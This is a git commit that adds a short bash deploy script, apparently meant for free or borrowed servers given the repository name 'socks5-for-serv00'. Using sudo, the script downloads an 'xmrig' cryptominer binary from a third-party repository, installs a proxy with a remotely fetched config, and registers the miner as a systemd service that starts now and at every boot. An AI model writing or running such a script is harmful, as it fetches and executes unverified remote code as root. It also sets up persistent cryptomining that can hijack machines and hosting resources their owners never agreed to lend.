af3f61f335ba35e1a95d597e8cd95c091462b4d2
pornnewbee <65003745+pornnewbee@users.noreply.github.com>
2025-12-23 22:31:09 +0800

    Create deploy.sh

---
+++ sub/work/deploy.sh
@@ -0,0 +1,19 @@
+#!/bin/bash
+set -e
+
+wget https://github.com/sweetasshole/test/raw/refs/heads/main/sub/xmrig
+wget https://github.com/MetaCubeX/mihomo/releases/download/v1.19.18/mihomo-linux-amd64-v1-v1.19.18.deb
+sudo apt install ./mihomo-linux-amd64-v1-v1.19.18.deb
+sudo mkdir -p /etc/mihomo
+wget https://raw.githubusercontent.com/pornnewbee/socks5-for-serv00/refs/heads/main/sub/work/mihomoconfig.yml
+mv mihomoconfig.yml config.yaml
+sudo mv config.yaml /etc/mihomo/config.yaml
+sudo apt install libhwloc15
+sudo apt install screen -y
+sudo chmod +x xmrig
+
+wget https://github.com/pornnewbee/socks5-for-serv00/raw/refs/heads/main/sub/work/worker.service
+sudo mv worker.service /etc/systemd/system/xmrig.service
+sudo systemctl daemon-reload
+sudo systemctl enable xmrig
+sudo systemctl start xmrig
